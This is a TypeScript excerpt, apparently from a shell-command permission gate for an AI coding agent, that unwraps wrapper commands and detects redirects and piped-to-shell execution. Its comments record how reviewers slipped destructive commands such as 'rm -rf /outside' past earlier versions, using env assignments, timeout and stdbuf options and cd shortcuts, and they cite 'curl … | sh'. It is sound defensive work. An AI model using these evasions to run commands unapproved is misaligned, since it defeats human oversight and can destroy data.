 */
const SAFE_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'status', 'log', 'diff', 'show', 'branch', 'remote', 'rev-parse', 'describe',
  'blame', 'shortlog', 'tag', 'ls-files', 'cat-file', 'reflog',
  'whatchanged', 'grep',
]);


/**
 * 该段是否带**有副作用的**输出重定向或命令替换。
 *
 * 抽出来是因为它有两个调用点,漏任一个都是绕过:`classifyShellSegment` 的常规路径,以及
 * `classifyShellCommand` 里 `cd <区内目录>` 的快捷放行分支 —— 后者原来直接 `continue`,
 * 于是 `cd /repo > /tmp/out && ls` 整条被判 `auto-approve`,重定向从未被看到(review P1)。
 *
 * 判定前先去掉引号内容(引号内的 `>` 是数据,如 `git log --format='%h>%s'`),再抹掉指向
 * 安全伪设备的重定向(`2>/dev/null`、`&>/dev/fd/1`):写伪设备等同丢弃、无落盘副作用,
 * 与 `SAFE_DEVICE_PATH` / `isProtectedSystemPath` 的白名单同口径。`/dev/null/x`、
 * `/dev/nullx`、`/dev/null.tmp`、`/dev/null-foo` 等相近路径不匹配(`(?![\w/.-])`),
 * 仍按普通文件写升级 —— 边界要把 `.` 和 `-` 一并挡住,否则这条正则会比它自称对齐的
 * `SAFE_DEVICE_PATH`(精确匹配设备名)更宽(review 报)。
 */
function segmentHasSideEffectRedirectOrSubstitution(segment: string): boolean {
  const redirectScan = segment
    .replace(/'[^']*'|"[^"]*"/g, '')
    .replace(/(?:\d*|&)>{1,2}\s*\/dev\/(?:null|zero|full|random|urandom|tty)(?![\w/.-])/gi, '');
  return OUTPUT_REDIRECTION.test(redirectScan) || COMMAND_SUBSTITUTION.test(segment);
}


/** 轻量 shell tokenizer：引号外按空白切，拼接相邻的 quoted/unquoted 片段并保留反斜杠。 */
function tokenize(segment: string, tokenizeOpts?: { powerShellQuotes?: boolean }): string[] {
  const tokens: string[] = [];
  let token = '';
  let tokenStarted = false;
  let quote: "'" | '"' | null = null;
  let substitutionDepth = 0;
  const flush = (): void => {
    if (!tokenStarted) return;
    tokens.push(token);
    token = '';
    tokenStarted = false;
  };
  for (let i = 0; i < segment.length; i++) {
    const char = segment[i]!;
    if (char === '\\' && quote !== "'" && i + 1 < segment.length) {
      tokenStarted = true;
      token += char + segment[i + 1]!;
      i++;
      continue;
    }
    if (quote) {
      // win32:双引号内反引号先于闭引号。POSIX 的 ` 是命令替换,开了会把 `"…`; rm …"` 藏进字符串。
      if (tokenizeOpts?.powerShellQuotes && quote === '"' && char === '`' && i + 1 < segment.length) {
        tokenStarted = true;
        token += char + segment[i + 1]!;
        i++;
        continue;
      }
      if (char === quote) quote = null;
      else token += char;
      tokenStarted = true;
      continue;
    }
    if ((char === '$' || char === '<') && segment[i + 1]! === '(') {
      token += `${char}(`;
      tokenStarted = true;
      substitutionDepth += 1;
      i++;
      continue;
    }
    if (substitutionDepth > 0) {
      token += char;
      tokenStarted = true;
      if (char === '(') substitutionDepth += 1;
      else if (char === ')') substitutionDepth -= 1;
      continue;
    }
    if (char === "'" || char === '"') {
      // Preserve the ANSI-C quote marker so callers can distinguish $'…'
      // (runtime escape decoding) from an ordinary single-quoted fragment.
      if (char === "'" && token.endsWith('$')) token += char;
      quote = char;
      tokenStarted = true;
    } else if (/\s/.test(char)) {
      flush();
    } else {
      token += char;
      tokenStarted = true;
    }
  }
  flush();
  return tokens;
}


/**
 * 去掉分段后残留的 shell 分组/控制关键字，让组内真实命令继续参与安全判定。
 * 含 `!`(否定退出码,但**命令照常执行** —— `! rm -rf /outside` 仍会删,codex 报)与 `elif`/`until`/
 * `while`/`if` 等把真实命令挡在后面的关键字。
 */
function stripShellControlTokens(tokens: string[]): string[] {
  const out = [...tokens];
  while (out.length > 0 && /^(?:\{|\(|!|then|do|else|elif|if|while|until)$/.test(out[0]!)) out.shift();
  if (out[0]!) out[0]! = out[0]!.replace(/^[({]+/, '');
  while (out[0]! === '') out.shift();
  const last = out.length - 1;
  if (last >= 0 && !/[$<]\(/.test(out[last]!) && !out[last]!.includes('{')) {
    out[last]! = out[last]!.replace(/[)}]+$/, '');
    if (out[last]! === '') out.pop();
  }
  return out;
}


type UnwrappedCommand = {
  tokens: string[];
  cwd?: string;
  cwdUnknown: boolean;
  inspectionOnly: boolean;
  /** 达到剥壳上限时首 token 仍是包装器 = 未能看到真实命令(超深嵌套 `env env … rm`)→ 消费方 fail-closed。 */
  wrapperUnresolved: boolean;
};


// 透明包装器剥壳的递归上限。取 16:现实里嵌 1-2 层(`env timeout … cmd`),16 足够;更深属对抗构造,
// 到上限仍是包装器则 fail-closed 必问(codex 报 `env env env env env env rm -rf /outside`)。
const MAX_WRAPPER_UNWRAP_DEPTH = 16;


function resolveCwdTarget(
  target: string | undefined,
  currentCwd: string | undefined,
  currentCwdUnknown = false,
): { cwd?: string; cwdUnknown: boolean } {
  if (!target || target === '-' || /[$`~{}*?[\]]/.test(target)) {
    return { cwdUnknown: true };
  }
  if (!isAbsolutePath(toForwardSlashes(target)) && (!currentCwd || currentCwdUnknown)) {
    return { cwdUnknown: true };
  }
  return {
    cwd: normalizeTarget(target, currentCwd ? [currentCwd] : []),
    cwdUnknown: false,
  };
}


/** 剥掉包裹器及其参数；同时保留 env -C/--chdir 对内层命令 cwd 的影响。 */
function unwrapCommand(
  tokens: string[],
  initialCwd?: string,
  initialCwdUnknown = false,
): UnwrappedCommand {
  let toks = stripShellControlTokens(tokens);
  let cwd = initialCwd;
  let cwdUnknown = initialCwdUnknown;
  let inspectionOnly = false;
  const applyCwd = (target: string | undefined): void => {
    const next = resolveCwdTarget(target, cwd, cwdUnknown);
    cwd = next.cwd;
    cwdUnknown = next.cwdUnknown;
  };
  let depth = 0;
  for (; depth < MAX_WRAPPER_UNWRAP_DEPTH && toks.length > 0; depth++) {
    // 前置环境赋值:bash simple-command 展开把 `NAME=val` 应用到命令环境后照常执行后面的命令
    // (`FOO=1 rm -rf /outside`)。不消费它们会把 `FOO=1` 当可执行名而看不到真正的 rm(codex 报)→
    // 先剥掉所有前导 assignment word,再识别真实执行器/包裹器。
    let assignEnd = 0;
    while (assignEnd < toks.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(toks[assignEnd]!)) assignEnd++;
    if (assignEnd > 0) toks = toks.slice(assignEnd);
    if (toks.length === 0) break;
    // executableName 归一 `.exe`/大小写:`env.exe`/`timeout.exe` 等包裹器也要剥壳,否则 `env.exe`(dump 环境)
    // 或 `timeout.exe 5 rm -rf /outside`(内层破坏)会因包裹器没被识别而漏判。
    const head = executableName(toks[0]!);
    if (!COMMAND_WRAPPERS.has(head)) break;
    if (head === 'env') {
      // env [-i] [-u NAME]... [-C DIR] [NAME=val...] cmd args。**必须精确消费带独立参数的选项** ——
      // `-u`/`--unset` 后跟的 NAME 若被当成内层命令(如 `env -u ls ./payload`:-u 消费 ls、真正执行的是
      // ./payload)会漏放行(codex 报)。未建模的选项(尤其 `-S`/`--split-string` 会把参数重解析成整条
      // 命令串)不猜测、保留原 token → 后续分类必 fail-closed 升级。
      let i = 1;
      let bail = false;
      while (i < toks.length) {
        const t = toks[i]!;
        if (t === '--') { i++; break; }
        if (t === '-' || t === '-i' || t === '--ignore-environment' || t === '-0' || t === '--null' || t === '-v' || t === '--debug') { i++; continue; }
        if (t === '-u' || t === '--unset') { i += 2; continue; }
        if (t === '-C' || t === '--chdir') {
          applyCwd(toks[i + 1]!);
          i += 2;
          continue;
        }
        const longChdir = /^--chdir=(.*)$/.exec(t);
        if (longChdir) { applyCwd(longChdir[1]!); i++; continue; }
        const shortChdir = /^-C=?(.+)$/.exec(t);
        if (shortChdir) { applyCwd(shortChdir[1]!); i++; continue; }
        if (/^--unset=/.test(t) || /^-u./.test(t)) { i++; continue; } // --unset=NAME / -uNAME
        if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(t)) { i++; continue; }                                 // NAME=VALUE
        if (t.startsWith('-')) { bail = true; break; }  // -S/--split-string 及一切未建模选项 → 不剥,fail-closed
        break;                                          // 内层命令
      }
      // bail 时 toks[i] 是可疑选项(如 -S),保留它作首 token → classifyShellSegment 认不出安全命令 → 升级。
      toks = toks.slice(i);
      if (bail) break;
    } else if (head === 'command') {
      // Bash builtin: command [-pVv] command [arg ...]. `-p` still executes the
      // inner command, while -v/-V only inspect it. Consume supported options
      // and `--` so a real executor cannot hide behind `command -p`.
      let i = 1;
      let bail = false;
      let inspectsCommand = false;
      while (i < toks.length) {
        const t = toks[i]!;
        if (t === '--') { i++; break; }
        if (/^-[pVv]+$/.test(t)) {
          if (/[Vv]/.test(t)) inspectsCommand = true;
          i++;
          continue;
        }
        if (t.startsWith('-')) { bail = true; break; }
        break;
      }
      toks = toks.slice(i);
      if (bail) break;
      if (inspectsCommand) {
        toks = [];
        inspectionOnly = true;
        break;
      }
    } else if (head === 'exec') {
      // POSIX shell builtin: exec [-cl] [-a name] [command [args…]]. 未建模选项不剥壳，
      // 保持 fail-closed；已知选项后继续递归识别真实执行器。
      let i = 1;
      let bail = false;
      while (i < toks.length) {
        const t = toks[i]!;
        if (t === '--') { i++; break; }
        if (t === '-a') { i += 2; continue; }
        if (/^-a.+/.test(t) || /^-[cl]+$/.test(t)) { i++; continue; }
        if (t.startsWith('-')) { bail = true; break; }
        break;
      }
      toks = toks.slice(i);
      if (bail) break;
    } else if (head === 'timeout' || head === 'time' || head === 'nice' || head === 'ionice' || head === 'chrt' || head === 'stdbuf') {
      // 带自身参数(timeout 5 / nice -n 10 / stdbuf -oL):跳过前导 `-*` 与紧随的数值/时长参数。
      let i = 1;
      while (i < toks.length) {
        const t = toks[i]!;
        // timeout -s/--signal SIG、-k/--kill-after DUR:带独立值选项,须连值一起消费 —— 否则停在 SIG(如 KILL)
        // 把真正的内层命令(rm 等)当参数漏掉(codex 报 `timeout -s KILL 5 rm -rf /outside`)。
        if (head === 'timeout' && /^(?:-s|--signal|-k|--kill-after)$/.test(t)) { i += 2; continue; }
        // stdbuf -i/-o/-e MODE(分离形态):MODE(如 `L`/`0`/`4K`)是独立 token,不连值消费会停在 MODE
        // 漏掉内层命令(codex 报 `stdbuf -o L rm -rf /outside`)。附加形态 `-oL`/`--output=L` 作单 token。
        if (head === 'stdbuf' && /^(?:-[ioe]|--input|--output|--error)$/.test(t)) { i += 2; continue; }
        // GNU time -f/--format FORMAT、-o/--output FILE 带值:分离形态不连值消费会停在 FORMAT(如 `%e`)漏掉
        // 内层命令(codex 报 `/usr/bin/time -f '%e' rm -rf /outside`)。bash 内建 time 无此选项、不受影响。
        if (head === 'time' && /^(?:-f|--format|-o|--output)$/.test(t)) { i += 2; continue; }
        // ionice -c/--class <class>:class 可为名字(idle/best-effort/realtime/none)或数字;命名值非数字,
        // 不连值消费会停在 `idle` 漏掉内层命令(codex 报 `ionice -c idle rm -rf /outside`)。
        if (head === 'ionice' && /^(?:-c|--class)$/.test(t)) { i += 2; continue; }
        // 时长可为浮点(timeout 文档:DURATION 是浮点数,`timeout 0.5 rm …`),整数正则会停在 0.5 漏掉内层
        // 命令(codex 报)→ 接受 `0.5` / `1.5s` / `.5` 等小数时长。
        if (t.startsWith('-') || /^\d*\.?\d+[smhd]?$/.test(t)) { i++; continue; }
        break;
      }
      toks = toks.slice(i);
    } else if (head === 'watch') {
      // watch [options] COMMAND:周期执行 COMMAND。`-n`/`--interval` 带值,其余 `-flag` 单 token,`--` 终结
      // 选项(codex 报 `watch -- rm -rf /outside`)。COMMAND 若是带空格的单 token(`watch 'rm -rf x'`)则再拆。
      let i = 1;
      while (i < toks.length) {
        const t = toks[i]!;
        if (t === '--') { i++; break; }
        // 带独立值选项:-n/--interval <secs>、-q/--equexit <cycles>(codex 报:漏了 equexit 会停在其值漏掉命令)。
        if (t === '-n' || t === '--interval' || t === '-q' || t === '--equexit') { i += 2; continue; }
        if (t.startsWith('-')) { i++; continue; }
        break;
      }
      toks = toks.slice(i);
      if (toks.length === 1 && /\s/.test(toks[0]!)) toks = tokenize(toks[0]!);
    } else if (head === 'flock') {
      // flock [options] <file> COMMAND [args] 或 flock [options] <file> -c '<shell 命令串>'。
      // 消费带值选项(-w/--timeout、-E/--conflict-exit-code),跳过一个 lockfile 操作数,其余为真实命令
      // (codex 报 `flock /tmp/lock rm -rf /outside`)。-c 形态其后是 shell 命令串,再拆成 argv。
      let i = 1;
      let shellForm = false;
      let consumedLockfile = false;
      while (i < toks.length) {
        const t = toks[i]!;
        if (t === '--') { i++; break; }
        if (t === '-w' || t === '--timeout' || t === '-E' || t === '--conflict-exit-code') { i += 2; continue; }
        if (t === '-c' || t === '--command') { shellForm = true; i++; break; }
        if (t.startsWith('-')) { i++; continue; }
        if (!consumedLockfile) { consumedLockfile = true; i++; continue; }
        break;
      }
      toks = toks.slice(i);
      if ((shellForm || toks.length === 1) && toks.length >= 1 && /\s/.test(toks[0]!)) toks = tokenize(toks[0]!);
    } else if (head === 'taskset') {
      // taskset [options] <mask> COMMAND 或 taskset -c/--cpu-list <list> COMMAND(codex 报 `taskset -c 0 rm …`)。
      // -p/--pid 是改已有进程的亲和性、不跑新命令 → 不解包(fail-closed 留原样)。
      if (toks.slice(1).some((t) => /^--pid$/.test(t) || /^-[a-z]*p[a-z]*$/i.test(t))) break;
      let i = 1;
      let cpuListGiven = false;
      while (i < toks.length) {
        const t = toks[i]!;
        if (t === '--') { i++; break; }
        if (t === '-c' || t === '--cpu-list') { cpuListGiven = true; i += 2; continue; }
        if (/^--cpu-list=/.test(t) || /^-c.+/.test(t)) { cpuListGiven = true; i++; continue; }
        if (t.startsWith('-')) { i++; continue; }
        break;
      }
      if (!cpuListGiven && i < toks.length) i++; // 无 -c 时首个非选项是 mask 操作数,跳过
      toks = toks.slice(i);
    } else if (head === 'prlimit') {
      // prlimit [options] [--<resource>=<limit>] COMMAND(codex 报 `prlimit --nofile=1024 rm -rf /outside`)。
      // 资源限额多为 `--nofile=1024` 附加形态;-p/--pid 是改已有进程、不跑命令 → 不解包(fail-closed 留壳)。
      if (toks.slice(1).some((t) => /^(?:-p|--pid)$/.test(t) || /^--pid=/.test(t))) break;
      let i = 1;
      while (i < toks.length && toks[i]!.startsWith('-')) {
        // -o/--output <list> 是带独立值选项:不连值消费会停在 RESOURCE 而看不到内层命令(codex 报)。
        if (/^(?:-o|--output)$/.test(toks[i]!)) { i += 2; continue; }
        i++;
      }
      toks = toks.slice(i);
    } else if (head === 'setarch') {
      // setarch [arch] [options] PROGRAM(codex 报 `setarch x86_64 rm -rf /outside`)。首个非选项若形似已知
      // 架构名则作 arch 跳过(否则它就是 PROGRAM,不误跳);其余选项跳过后即真实命令。--list 无 PROGRAM。
      let i = 1;
      let archConsumed = false;
      while (i < toks.length) {
        const t = toks[i]!;
        if (t === '--') { i++; break; }
        if (t.startsWith('-')) { i++; continue; }
        if (!archConsumed
          && /^(?:x86_64|i[3456]86|ia64|s390x?|ppc(?:64(?:le)?)?|arm(?:v[0-9]+l?)?|aarch64|mips\w*|sparc\w*|riscv\w*|uname26|linux(?:32|64))$/i.test(t)) {
          archConsumed = true; i++; continue;
        }
        break; // PROGRAM
      }
      toks = toks.slice(i);
    } else if (head === 'unshare' || head === 'nsenter' || head === 'setpriv') {
      // 只消费 `-…` 选项;**仅对确知带独立值的选项**多吃一个 token —— 宁可少吃(留下的值当命令名 →
      // 未知 bin → 灰区,fail-closed)也不能多吃(会把真正的 rm 吞掉 → 漏红线)。
      // `--wd/-w DIR` 改工作目录(同 env -C);`--root/-R/-r` 换根 → 路径语义不可静态求证 → cwdUnknown。
      const valued = head === 'unshare'
        ? /^(?:--setuid|--setgid|--propagation|--map-user|--map-group|--wd|--root|-S|-G|-w|-R)$/
        : head === 'nsenter'
          ? /^(?:--target|--wd|--root|--setuid|--setgid|-t|-w|-r|-S|-G)$/
          // setpriv 的带值选项:除 --reuid/--regid,还有 --euid/--ruid/--egid/--rgid(codex 报:遗漏它们
          // 会让解析停在 uid 值 `0` 而看不到内层 rm)。
          : /^(?:--reuid|--regid|--euid|--ruid|--egid|--rgid|--groups|--securebits|--pdeathsig|--selinux-label|--apparmor-profile|--ambient-caps|--inh-caps|--bounding-set|--rlimit)$/;
      let i = 1;
      let rootChanged = false;
      while (i < toks.length) {
        const t = toks[i]!;
        if (t === '--') { i++; break; }
        if (!t.startsWith('-')) break;
        if (/^(?:--root|-R|-r)(?:=|$)/.test(t)) rootChanged = true;
        const wd = /^(?:--wd|-w)=(.+)$/.exec(t);
        if (wd) { applyCwd(wd[1]!); i++; continue; }
        const rootAttached = /^(?:--root|-R|-r)=(.+)$/.exec(t);
        if (rootAttached) { i++; continue; }
        if (valued.test(t)) {
          if (/^(?:--wd|-w)$/.test(t)) applyCwd(toks[i + 1]!);
          i += 2;
          continue;
        }
        i++;
      }
      toks = toks.slice(i);
      // 换根后 `/outside` 之类绝对路径指向新根下的位置,静态不可证 → 相对与绝对目标都按未知处理。
      if (rootChanged) { cwd = undefined; cwdUnknown = true; }
    } else if (head === 'script') {
      // 两种形态都会跑命令:util-linux `script [opts] -c '<命令串>' [file]`(值经 shell 执行)与
      // BSD/macOS `script [opts] [file [command ...]]`(尾随 argv)。带独立值的日志/管道选项要消费其值,
      // 否则解析会停在文件名;`-t`(util-linux 的 --timing 可无值)刻意不消费 —— 少吃只会让它当成
      // file 操作数被跳过,多吃则可能把真正的命令吞掉。
      let i = 1;
      let commandString: string | undefined;
      let fileConsumed = false;
      while (i < toks.length) {
        const t = toks[i]!;
        if (t === '--') { i++; break; }
        if (t.startsWith('-')) {
          const attachedCmd = /^(?:--command=|-c)(.+)$/.exec(t);
          if (attachedCmd) { commandString = attachedCmd[1]!; i++; continue; }
          if (/^(?:-c|--command)$/.test(t)) { commandString = toks[i + 1]!; i += 2; continue; }
          if (/^(?:-T|--log-timing|-I|--log-in|-B|--log-io|-O|--log-out|-m|--logging-format|-F)$/.test(t)) {
            i += 2; continue;
          }
          i++;
          continue;
        }
        if (!fileConsumed) { fileConsumed = true; i++; continue; } // typescript 输出文件
        break; // BSD 形态的 command
      }
      if (commandString !== undefined) {
        if (!commandString) break; // -c 缺值 → 形态不可解析,留壳 fail-closed
        toks = tokenize(commandString);
      } else {
        if (i >= toks.length) break; // 没有内层命令(纯记录交互会话)→ 留壳
        toks = toks.slice(i);
      }
    } else if (head === 'sg') {
      // sg GROUP [-c] '<命令串>':以另一个组身份执行命令串(缺 -c 时最后一个操作数同样是命令串)。
      let i = 1;
      let groupConsumed = false;
      let shellForm = false;
      while (i < toks.length) {
        const t = toks[i]!;
        if (t === '--') { i++; break; }
        if (t === '-c' || t === '--command') { shellForm = true; i++; break; }
        if (t.startsWith('-')) { i++; continue; }
        if (!groupConsumed) { groupConsumed = true; i++; continue; }
        break;
      }
      toks = toks.slice(i);
      if (toks.length === 0) break; // 只切组、没有命令(交互 shell)→ 留壳
      if ((shellForm || toks.length === 1) && /\s/.test(toks[0]!)) toks = tokenize(toks[0]!);
    } else if (head === 'arch' || head === 'caffeinate') {
      // macOS:`arch [-arch NAME] [-e VAR=VAL] … command args`、`caffeinate [-disu] [-t secs] [-w pid] command`。
      // 只消费确知带独立值的选项(少吃 → 值当命令名 → 未知 bin → 灰区 fail-closed)。
      const valued = head === 'arch'
        ? /^(?:-arch|-e|-d|-l)$/
        : /^(?:-t|-w)$/;
      let i = 1;
      while (i < toks.length) {
        const t = toks[i]!;
        if (t === '--') { i++; break; }
        if (!t.startsWith('-')) break;
        if (valued.test(t)) { i += 2; continue; }
        i++;
      }
      if (i >= toks.length) break; // 裸 `arch`/`caffeinate` 不跑命令 → 留壳
      toks = toks.slice(i);
    } else if (head === 'setsid' || head === 'unbuffer') {
      // setsid [-c] [-f] [-w] PROGRAM:选项在实际 program 之前,只删 setsid 会停在 `-f`/`--wait` 而看不到
      // 内层命令(codex 报 `setsid -f rm -rf /outside`)。这些选项都不带值 → 逐个跳过,`--` 终结选项。
      // unbuffer 同形(`unbuffer [-p] PROGRAM`,唯一选项 -p 不带值)。
      let i = 1;
      while (i < toks.length) {
        if (toks[i]! === '--') { i++; break; }
        if (toks[i]!.startsWith('-')) { i++; continue; }
        break;
      }
      toks = toks.slice(i);
    } else {
      // nohup / builtin 等无自身参数的包裹器:直接跳过包裹器本身。
      toks = toks.slice(1);
    }
  }
  // 仅当**跑满剥壳上限**(depth 到 MAX,而非分支主动 break 的正常完成/fail-closed 留壳)且首 token 仍是
  // 包装器 → 超深链没剥完、真实命令没露出来,标记 fail-closed(消费方必问)。分支主动 bail(如 taskset -p、
  // env -S)在 depth<MAX 处 break,不算未解析,避免误升。
  const wrapperUnresolved = depth >= MAX_WRAPPER_UNWRAP_DEPTH
    && toks.length > 0 && COMMAND_WRAPPERS.has(executableName(toks[0]!));
  return { tokens: toks, cwd, cwdUnknown, inspectionOnly, wrapperUnresolved };
}


/** 无需 cwd 语义的调用点只取剥壳后的真实 argv。 */
function unwrapWrappers(tokens: string[]): string[] {
  return unwrapCommand(tokens).tokens;
}


function baseName(p: string): string {
  // 同时按 `/` 与 `\` 取末段:Windows Codex 会话把命令以完整反斜杠路径传入
  // (`C:\Program Files\…\pwsh.exe`、`C:\…\rm.exe`),只认 `/` 会把整条路径当文件名,
  // 令 PowerShell / rm / git 等红线判定全部落空(codex 报,translator 已固定该形态)。
  const cleaned = p.replace(/[\\/]+$/, '');
  const idx = Math.max(cleaned.lastIndexOf('/'), cleaned.lastIndexOf('\\'));
  return idx >= 0 ? cleaned.slice(idx + 1) : cleaned;
}


/** Executable identity is case-insensitive on Windows; Git Bash commonly exposes `*.exe`. */
function executableName(token: string): string {
  return baseName(token).toLowerCase().replace(/\.exe$/, '');
}


type ShellSeparator = 'and' | 'or' | 'pipe' | 'sequence' | 'background' | 'end';

type ExecutableSegment = { text: string; fromPipe: boolean; separatorAfter: ShellSeparator };


/** 仅供高影响执行判定：识别引号外的 shell 分隔符，避免把 `echo 'x | sh'` 误当执行。 */
function splitExecutableSegments(
  command: string,
  splitOpts?: { powerShellQuotes?: boolean },
): ExecutableSegment[] {
  const out: ExecutableSegment[] = [];
  let start = 0;
  let fromPipe = false;
  let singleQuoted = false;
  let doubleQuoted = false;
  let escaped = false;
  let substitutionDepth = 0;
  for (let i = 0; i < command.length; i++) {
    const char = command[i]!;
    if (escaped) { escaped = false; continue; }
    if (char === '\\' && !singleQuoted) { escaped = true; continue; }
    // win32:双引号内 `X 是字面 X,必须在切换闭引号之前消费;POSIX 的 ` 是命令替换,不能开。
    if (splitOpts?.powerShellQuotes && doubleQuoted && char === '`' && i + 1 < command.length) {
      i++;
      continue;
    }
    if (char === "'" && !doubleQuoted) { singleQuoted = !singleQuoted; continue; }
    if (char === '"' && !singleQuoted) { doubleQuoted = !doubleQuoted; continue; }
    if (singleQuoted || doubleQuoted) continue;
    // shell 注释:词首的 `#` 到行尾都被忽略。**必须在引号状态更新之后处理** —— 注释里的
    // 未闭合引号(`echo ok # "`)否则会把后续换行吞进 quoted 状态,令下一行命令不再单独
    // 切分、整段按第一行放行(review 报)。只在词边界(行首 / 空白 / `;|&(` 之后)才算注释,
    // `foo#bar` 里的 `#` 是普通字符。
    if (char === '#' && (i === 0 || /[\s;|&(]/.test(command[i - 1]! ?? ''))) {
      const newline = command.indexOf('\n', i);
      if (newline === -1) break;      // 注释一直到命令末尾:后面没有可执行内容
      i = newline - 1;                // 跳过注释体,让循环下一步照常把 `\n` 当分隔符处理
      continue;
    }
    // `$(` 命令替换、`<(`/`>(` 进程替换都成组,组内的 `|`/`;` 不是顶层分隔符 → 一并按深度跳过
    // (自审补:此前漏了输出进程替换 `>(`,`>(cmd1; cmd2)` 里的 `;` 会被误当顶层分隔)。
    if ((char === '$' || char === '<' || char === '>') && command[i + 1]! === '(') {
      substitutionDepth += 1;
      i++;
      continue;
    }
    if (substitutionDepth > 0) {
      if (char === '(') substitutionDepth += 1;
      else if (char === ')') substitutionDepth -= 1;
      continue;
    }
    let separatorLength = 0;
    let nextFromPipe = false;
    let separatorAfter: ShellSeparator = 'sequence';
    if (char === '|') {
      separatorLength = command[i + 1]! === '|' || command[i + 1]! === '&' ? 2 : 1;
      nextFromPipe = command[i + 1]! !== '|';
      separatorAfter = nextFromPipe ? 'pipe' : 'or';
    } else if (char === '&' && command[i - 1]! !== '>' && command[i + 1]! !== '>') {
      separatorLength = command[i + 1]! === '&' ? 2 : 1;
      separatorAfter = command[i + 1]! === '&' ? 'and' : 'background';
    } else if (char === ';' || char === '\n') {
      separatorLength = 1;
      separatorAfter = 'sequence';
    }
    if (separatorLength === 0) continue;
    const text = command.slice(start, i).trim();
    if (text) out.push({ text, fromPipe, separatorAfter });
    fromPipe = nextFromPipe;
    i += separatorLength - 1;
    start = i + 1;
  }
  const text = command.slice(start).trim();
  if (text) out.push({ text, fromPipe, separatorAfter: 'end' });
  return out;
}


const SHELL_EXECUTORS: ReadonlySet<string> = new Set([
  'sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'csh', 'tcsh',
]);


/**
 * 这个管道右侧的解释器会不会**把 stdin 当成程序执行**。
 *
 * 这是 `curl … | sh` 与 `grep … | awk '{print $1}'` 的本质区别,此前被压成同一条红线:
 * 只要右侧 bin 在 PIPE_EXECUTORS 里就一律 `prompt-each-time`。实机语料实测,该判据产出的
 * 65 条红线里**真正管道到 shell 的是 0 条** —— 46 条是 `| awk '字面脚本'`、
 * `| python3 -m json.tool`、`| xargs grep -l foo` 这类日常数据处理被误判。
 *
 * 判据:程序来源是否为 stdin。
 *  - `sh` / `bash`(无 `-c`)、裸 `python3` / `node` / `ruby`:stdin 就是源码 → **是**;
 *  - `python3 -c '…'` / `node -e '…'` / `bash -c '…'`:程序是字面量参数,静态可见
 *    (且各自另有 payload 递归审查)→ 否;
 *  - `python3 -m json.tool`:程序是具名模块 → 否;
 *  - `awk '脚本'` / `awk -f f.awk`:awk 的程序**永远**是显式操作数,从不来自 stdin → 否;
 *  - `xargs` / `parallel`:stdin 变成的是**参数**而非程序,且下方有专门的 xargs 递归分析
 *    (此前这条捷径把它抢先判红,专门分析根本跑不到)→ 否;
 *  - 带脚本文件操作数(`python3 run.py`)→ 否。
 *
 * 安全性不放宽:凡「远端内容流进解释器」仍由调用点的 `pipeCarriesRemoteContent` 分支
 * 保持红线 —— `curl … | python3 -c '…'` 照旧必问。本函数只负责把**本地**数据处理
 * 从红线里摘出来。
 */
/**
 * awk 字面脚本里「把数据交出去执行」的出口。命中即按「stdin 会被当命令跑」处理。
 *
 * `system(…)` 与 `print … | "cmd"` 只是其中两种;review 指出 `awk '$0 | getline'` 同样
 * 把每一行当 shell 命令执行(GNU awk 实测有真实文件副作用),而它既没有 `system(` 也没有
 * 引号紧邻的 `|`。凡是 `getline` / `close(` 参与的形态都可能接管道命令,一并纳入 ——
 * 代价是 `awk '{getline; print}'` 这类纯读下一行也会落红线(fail-closed 方向,可接受)。
 * 刻意**不**用「脚本里出现任意 `|`」作判据:那会把 `awk '/foo|bar/'` 这种正则 alternation
 * 全部误升。
 */
const AWK_SCRIPT_EXECUTES_COMMANDS =
  /\bsystem\s*\(|\bENVIRON\b|\bgetline\b|\bclose\s*\(|\|\s*["']|["']\s*\||\b(?:print|printf)\b[^;}\n]*\|/;


/**
 * shell **不吃参数**的短选项字符 / 长选项。与解释器表同一个 fail-closed 方向:只登记确定
 * 无值的,其余(`-o option`、`-O shopt`、`--rcfile FILE`、zsh `--emulate SHELL`…)一律当作
 * 「可能吃掉下一个 token」。
 */
const SHELL_VALUELESS_SHORT_FLAGS: ReadonlySet<string> = new Set(
  ['a', 'b', 'e', 'f', 'h', 'i', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'u', 'v', 'x',
    'B', 'C', 'D', 'E', 'H', 'P', 'T'],
);

const SHELL_VALUELESS_LONG_OPTIONS: ReadonlySet<string> = new Set([
  '--login', '--interactive', '--norc', '--noprofile', '--noediting', '--posix',
  '--restricted', '--verbose', '--debug', '--debugger', '--dump-strings',
  '--dump-po-strings', '--protected', '--pretty-print', '--no-rcs', '--no-globalrcs',
  '--help', '--version',
]);


/**
 * shell 的源码选择器(`-c`)是否落在**真实选项位**;落在选项位时返回它的命令字符串。
 *
 * 与 `analyzeInterpreterArgs` 同一套按位解析:`bash --rcfile -c` 里的 `-c` 是 `--rcfile`
 * 的**值**,bash 仍然从 stdin 执行 —— 位置无关地搜 `-c` 会把这条「stdin 即程序」误判成
 * 「程序是字面量」、从确定性必问降进灰区(review 报)。表外选项即 fail-closed 返回 null,
 * 由调用方按「找不到可信的源码选择器」处理。
 *
 * 只服务于 stdin 判定;取**载荷**仍用 `shellCommandPayload`(那边的宽松搜索是为了把内层
 * 命令递归交出去审,收紧它反而会漏掉内层红线)。
 */
function shellSourceSelectorPayload(tokens: string[]): string | null {
  if (!SHELL_EXECUTORS.has(executableName(tokens[0]! ?? ''))) return null;
  for (let i = 1; i < tokens.length; i++) {
    const token = tokens[i]! as string;
    if (token === '--') return null;
    if (token === '--command') return tokens[i + 1]! ?? '';
    if (token.startsWith('--command=')) return token.slice('--command='.length);
    if (token.startsWith('--')) {
      if (token.includes('=') || SHELL_VALUELESS_LONG_OPTIONS.has(token)) continue;
      return null;                                    // 表外长选项:可能吃掉下一个 token
    }
    if (!/^[-+][A-Za-z]+$/.test(token)) return null;  // 操作数位:后面不会再有选项
    const chars = token.slice(1).split('');
    const cAt = chars.indexOf('c');
    // 簇写里只有 `c` **之前**全是无值开关时(`-lc` / `-xec`),下一个 token 才确定是命令字符串。
    if (cAt >= 0) {
      return chars.slice(0, cAt).every((ch) => SHELL_VALUELESS_SHORT_FLAGS.has(ch))
        ? tokens[i + 1]! ?? '' : null;
    }
    if (chars.every((ch) => SHELL_VALUELESS_SHORT_FLAGS.has(ch))) continue;
    return null;                                      // 表外短选项:同样 fail-closed
  }
  return null;
}


